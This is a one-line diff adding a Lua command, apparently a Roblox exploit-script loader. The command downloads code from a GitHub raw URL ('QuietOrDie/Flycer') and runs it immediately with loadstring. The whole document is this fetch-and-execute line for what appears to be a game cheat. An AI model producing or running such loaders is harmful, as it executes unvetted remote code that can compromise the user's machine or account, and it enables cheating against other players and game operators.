@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kyoukara/QuietOrDie/refs/heads/main/Flycer"))()
